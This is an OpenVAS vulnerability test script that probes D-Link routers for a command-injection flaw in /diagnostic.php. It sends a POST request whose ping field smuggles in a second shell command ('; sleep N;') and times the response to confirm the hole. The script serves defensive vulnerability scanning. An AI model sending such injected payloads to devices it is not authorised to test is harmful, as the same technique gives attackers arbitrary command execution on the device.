###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_multiple_devices_58938.nasl 11 2013-10-27 10:12:02Z jan $
#
# Multiple D-Link Products Command Injection and Multiple Information Disclosue Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Multiple D-Link products are prone to a command-injection
vulnerability and multiple information-disclosure vulnerabilities.

Exploiting these issues could allow an attacker to gain access to
potentially sensitive information and execute arbitrary commands in
the context of the affected device.";


tag_solution = "Reportedly the issue is fixed. Please contact the vendor for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103691";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(58938);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Multiple D-Link Products Command Injection and Multiple Information Disclosue Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58938");
 script_xref(name:"URL", value:"http://www.dlink.com/");
 script_xref(name:"URL", value:"http://www.s3cur1ty.de/m1adv2013-017");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-04-09 12:07:13 +0200 (Tue, 09 Apr 2013)");
 script_description(desc);
 script_summary("Determine if the remote dlink is prone to command-injection");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_dlink_dir_detect.nasl");
 script_require_ports("Services/www", 80, 8080);
 script_require_keys("host_is_dlink_dir");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_kb_item("dlink_dir_port");
if(!port)exit(0);
if(!get_port_state(port))exit(0);

host = get_host_name();

sleep = make_list(3, 5, 10);

foreach i (sleep) {

  ex = 'act=ping&dst=%3b%20sleep ' + i  + '%3b';
  len = strlen(ex);

  req = string("POST /diagnostic.php HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 OpenVAS/16.0\r\n",
               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
               "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
               "Accept-Encoding: identity\r\n",
               "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
               "Referer: http://",host,"/\r\n",
               "Content-Length: ",len,"\r\n",
               "Cookie: uid=hfaiGzkB4z\r\n",
               "\r\n",
               ex
               );

  start = unixtime();
  result = http_send_recv(port:port, data:req, bodyonly:FALSE);
  stop = unixtime();

  if(stop - start < i || stop - start > (i+5)) exit(0); # not vulnerable

}  

security_hole(port:port);
exit(0);

